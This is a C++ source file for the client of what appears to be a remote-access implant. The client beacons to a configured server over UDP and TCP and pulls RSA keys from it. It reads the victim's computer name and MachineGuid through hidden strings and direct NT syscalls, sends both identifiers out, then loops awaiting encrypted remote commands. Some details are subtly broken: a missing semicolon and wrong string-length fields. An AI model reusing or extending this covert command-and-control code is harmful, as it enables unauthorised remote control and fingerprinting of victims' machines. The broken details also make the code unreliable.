#include "client.h"
#include "External/obfuscate.h"
#include "serialization.h"

#ifdef CLIENT_RELEASE

Client::Client() {
	NetCommon::LoadWSAFunctions();

	// setup udp addr

	hostent* host = GetHostByName(DNS_NAME.c_str());
	if ( host == NULL )
		return;

	sockaddr_in addr;
	memcpy(&addr.sin_addr, host->h_addr_list[0], host->h_length);
	addr.sin_family = AF_INET;
	addr.sin_port = HostToNetworkShort(UDP_PORT);

	// set udp server info
	this->m_UDPServerDetails.addr = addr;
	this->m_UDPServerDetails.domain = AF_INET;
	this->m_UDPServerDetails.port = UDP_PORT;
	this->m_UDPServerDetails.type = SOCK_DGRAM;

	SetRemoteMachineGUID();
	SetRemoteComputerName();
}

Client::~Client() {
	this->Disconnect(); // disconnect incase the socket is still connected

	CleanWSA();
	m_ProcMgr.FreeUsedLibrary(std::string(HIDE("Ws2_32.dll")));
}

void Client::SetRemoteComputerName() {
	char  buffer[256];
	DWORD buffSize = sizeof(buffer);

	// get computer name
	BOOL success = GetComputerNameA(buffer, &buffSize);
	if ( success ) {
		this->m_ComputerName = buffer;
	}
}

BOOL Client::Connect() {
	// make request to udp server
	this->m_UDPSocket = CreateSocket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
	if ( this->m_UDPSocket == INVALID_SOCKET )
		return FALSE;

	ClientRequest request(ClientRequest::kConnectClient, 0, this->m_UDPSocket);

	OutputDebugStringA("sending");
	BOOL validServerResponse = SendMessageToServer(this->m_UDPServerDetails, request);
	if ( !validServerResponse )
		return FALSE;  
	OutputDebugStringA("sent");

	UDPResponse response;
	sockaddr_in serverAddr;
	BOOL received = ReceiveMessageFromServer(this->m_UDPServerDetails, response, serverAddr);
	if ( !received )
		return FALSE;

	this->m_UDPServerDetails.addr = serverAddr;
	this->m_TCPServerDetails = response.TCPServer;

	// connect to tcp server
	this->m_TCPSocket = CreateSocket(AF_INET, SOCK_STREAM, 0);
	if ( this->m_TCPSocket == INVALID_SOCKET )
		return FALSE;

	int connect = ConnectSocket(this->m_TCPSocket, ( sockaddr* ) &this->m_TCPServerDetails.addr, sizeof(this->m_TCPServerDetails.addr));
	if ( connect == SOCKET_ERROR )
		return FALSE;
	OutputDebugStringA("socket");

	GetRequestRSAKeysFromServer();
	SendComputerNameToServer();
	SendMachineGUIDToServer();
	OutputDebugStringA("yes");
	return TRUE;
}

void Client::SetRemoteMachineGUID() {
	OBJECT_ATTRIBUTES obj;
	InitializeObjectAttributes(&obj, 0, 0, 0, 0);

	std::string hiddenRegPath = std::string(HIDE("\\Registry\\Machine\\Software\\Microsoft\\Cryptography"));
	std::wstring wide = std::wstring(hiddenRegPath.begin(), hiddenRegPath.end());

	UNICODE_STRING reg;
	reg.Buffer = wide.data();
	reg.Length = wide.size() * sizeof(wchar_t);
	reg.MaximumLength = sizeof(reg.Buffer);

	std::string hiddenName = std::string(HIDE("MachineGuid"));
	std::wstring name = std::wstring(hiddenName.begin(), hiddenName.end());

	UNICODE_STRING valueName;
	valueName.Buffer = name.data();
	valueName.Length = name.size() * sizeof(wchar_t);
	valueName.MaximumLength = sizeof(valueName.Length);

	obj.Length = sizeof(OBJECT_ATTRIBUTES);
	obj.RootDirectory = NULL;
	obj.ObjectName = &reg;
	obj.SecurityDescriptor = NULL;
	obj.SecurityQualityOfService = NULL;
	obj.Attributes = OBJ_CASE_INSENSITIVE;

	HANDLE key;
	SysNtOpenKey(&key, GENERIC_READ, &obj);

	char buffer[512];
	u_long size;
	SysNtQueryValueKey(key, &valueName, KeyValuePartialInformation, buffer, sizeof(buffer), &size);
	PKEY_VALUE_PARTIAL_INFORMATION pk = ( PKEY_VALUE_PARTIAL_INFORMATION ) buffer;
	std::wstring data = ( wchar_t* ) pk->Data;
	std::string string = std::string(data.begin(), data.end());
	this->m_MachineGUID = string;
}

BYTESTRING Client::MakeTCPRequest(const ClientRequest& req, BOOL encrypted) {

	BOOL sent = encrypted ? SendEncryptedMessageToServer(this->m_TCPServerDetails, req) : SendMessageToServer(this->m_TCPServerDetails, req);
	if ( !sent ) return {};

	BYTESTRING serverResponse;
	BOOL received = NetCommon::ReceiveData(serverResponse, this->m_TCPSocket, TCP, NetCommon::_default, encrypted, Serialization::GetBIOFromString(this->m_RequestSecrets.strPublicKey));
	if ( !received ) return {};

	return serverResponse;
}

BOOL Client::SendComputerNameToServer() {
	return SendMessageToServer(this->m_ComputerName, TRUE);
}

BOOL Client::SendMachineGUIDToServer() {
	return SendMessageToServer(this->m_MachineGUID, TRUE);
}

BOOL Client::PerformCommand(const ServerCommand& command, ClientResponse& outResponse) {
	BOOL success = FALSE;
	switch ( command.action ) {
	case RemoteAction::kPingClient:
		outResponse.actionPerformed = RemoteAction::kPingClient;
		outResponse.responseCode = ClientResponseCode::kResponseOk;
		outResponse.id = rand() % 100;
		success = TRUE;
		break;
	case RemoteAction::kOpenRemoteProcess:
		// todo:
		break;
	}
	return success;
}

BOOL Client::IsServerAwaitingResponse(const ServerCommand& commandPerformed) {
	BOOL sendResponse = FALSE;
	switch ( commandPerformed.action ) {
	case RemoteAction::kPingClient:
		sendResponse = TRUE;
		break;
	}
	return sendResponse;
}

void Client::ListenForServerCommands() {
	while ( TRUE ) {
		BYTESTRING encrypted;
		ClientResponse response; // response to send to server after receiving a request

		CLIENT_DBG("setup recv");
		// receive data on tcp socket, put it into buffer
		BOOL received = NetCommon::ReceiveData(
							encrypted,
							this->m_TCPSocket,
							TCP
						);

		BYTESTRING decryptedB64BS = LGCrypto::RSADecrypt(encrypted, Serialization::GetBIOFromString(this->m_RequestSecrets.strPublicKey), FALSE);
		CLIENT_DBG("step 1");

		std::string decryptedB64 = Serialization::BytestringToString(decryptedB64BS);
		CLIENT_DBG("step 2");

		std::string serializedString;
		macaron::Base64::Decode(decryptedB64, serializedString);
		CLIENT_DBG("step 3");

		BYTESTRING serializedData = Serialization::SerializeString(serializedString);
		CLIENT_DBG("STEP 4");

		ServerCommand command = Serialization::DeserializeToStruct<ServerCommand>(serializedData);

		CLIENT_DBG("step 5")


		if ( !received || !command.valid )
			continue;

		BOOL performed = PerformCommand(command, response);

		if ( !performed )
			continue;

		if ( !IsServerAwaitingResponse(command) )
			continue;

		BOOL sent = NetCommon::TransmitData(
			response,
			this->m_TCPSocket,
			TCP,
			NetCommon::_default,
			TRUE,
			Serialization::GetBIOFromString(this->m_RequestSecrets.strPublicKey)
		);
	}
	CLIENT_DBG("stopped receiving cmds ");
}

void Client::ReceiveCommandsFromServer() { 
	
	MessageBoxA(NULL, "HI", "HI", MB_OK);
}

std::string OnReceiveKey(BYTESTRING serialized) {
	std::string b64priv = Serialization::BytestringToString(serialized);
	std::string key = ""; // private request key
	macaron::Base64::Decode(b64priv, key);
	return key;
}

BOOL Client::GetRequestRSAKeysFromServer() {
	ClientRequest privKeyRequest(ClientRequest::kGetRequestEncryptionKeyPrivate, this->m_TCPSocket);
	ClientRequest pubKeyRequest(ClientRequest::kGetRequestEncryptionKeyPublic, this->m_TCPSocket);

	// receive the rsa pair
	BYTESTRING serializedPrivKey = MakeTCPRequest(privKeyRequest);
	// step 1 receive request private key
	this->m_RequestSecrets.strPrivateKey = OnReceiveKey(serializedPrivKey);
	CLIENT_DBG("got private key!");
	CLIENT_DBG(this->m_RequestSecrets.strPrivateKey.c_str());

	// step 2 receive request public key thats encrypted with the public key, decrypt it with the private key
	BYTESTRING encryptedPubKey = MakeTCPRequest(pubKeyRequest);
	this->m_RequestSecrets.strPublicKey = OnReceiveKey(encryptedPubKey);
	CLIENT_DBG("got public key!");
	CLIENT_DBG(this->m_RequestSecrets.strPublicKey.c_str());
	
	return !this->m_RequestSecrets.strPublicKey.empty();
}

BOOL Client::SendMessageToServer(std::string message, BOOL encrypted) {	
	CLIENT_DBG(message.c_str());

	BYTESTRING serialized = Serialization::SerializeString(message);
	BOOL	   success    = FALSE;

	if ( encrypted ) {
		success = NetCommon::TransmitData(serialized, this->m_TCPSocket, TCP, NetCommon::_default, TRUE, Serialization::GetBIOFromString(this->m_RequestSecrets.strPublicKey), FALSE);
	} else
		success = NetCommon::TransmitData(serialized, this->m_TCPSocket, TCP);

	return success;
}

template <typename _Ty>
BOOL Client::ReceiveMessageFromServer(const Server& who, _Ty& out, sockaddr_in& outAddr) {
	if ( who.type == SOCK_STREAM )
		return NetCommon::ReceiveData(out, this->m_TCPSocket, TCP);
	else if ( who.type == SOCK_DGRAM )
		return NetCommon::ReceiveData(out, this->m_UDPSocket, UDP, outAddr);
	
	return FALSE;
}

BOOL Client::SendMessageToServer(const Server& dest, ClientMessage message) {
	if ( dest.type == SOCK_STREAM ) // tcp
		return NetCommon::TransmitData(message, this->m_TCPSocket, TCP);
	else if ( dest.type == SOCK_DGRAM ) // udp
		return NetCommon::TransmitData(message, this->m_UDPSocket, UDP, dest.addr);

	return FALSE;
}

BOOL Client::SendEncryptedMessageToServer(const Server& dest, ClientMessage message) {
	BIO* pk = Serialization::GetBIOFromString(this->m_RequestSecrets.strPublicKey);
	BOOL success = FALSE;
	if ( dest.type == SOCK_STREAM ) // tcp
		success = NetCommon::TransmitData(message, this->m_TCPSocket, TCP, NetCommon::_default, TRUE, pk, FALSE);
	else if ( dest.type == SOCK_DGRAM ) // udp
		success = NetCommon::TransmitData(message, this->m_UDPSocket, UDP, dest.addr, TRUE, pk, FALSE);

	return success;
}

template <typename _Ty>
BOOL Client::GetEncryptedMessageOnServer(const Server& dest, _Ty& out) {
	BIO* pk = Serialization::GetBIOFromString(this->m_RequestSecrets.strPublicKey);
	BOOL success = FALSE;

	if ( dest.type == SOCK_STREAM )
		success = NetCommon::ReceiveData(out, this->m_TCPSocket, TCP, NetCommon::_default, TRUE, pk, FALSE);

	return success;
}

BOOL Client::Disconnect() {
	ClientRequest disconnectRequest(ClientRequest::kDisconnectClient);
	MakeTCPRequest(disconnectRequest, TRUE);

	CloseSocket(this->m_UDPSocket);
	int status = CloseSocket(this->m_TCPSocket);
	if ( status == SOCKET_ERROR )
		return FALSE;

	this->m_UDPSocket = INVALID_SOCKET;
	this->m_TCPSocket = INVALID_SOCKET;

	return TRUE;
}

#elif defined(SERVER_RELEASE)

Client::Client(SOCKET tcp, SOCKET udp, sockaddr_in addr)
	: AddressInfo(addr), m_TCPSocket(tcp), m_UDPSocket(udp)
{
	std::random_device gen;
	std::mt19937 rng(gen());
	std::uniform_int_distribution<std::mt19937::result_type> dist(1, 100000);
	this->ClientUID = dist(rng);
}

void Client::Disconnect() {
	if ( this->m_UDPSocket != INVALID_SOCKET )
		CloseSocket(this->m_UDPSocket);

	if ( this->m_TCPSocket != INVALID_SOCKET )
		CloseSocket(this->m_TCPSocket);

	this->Alive = FALSE;
}

#endif
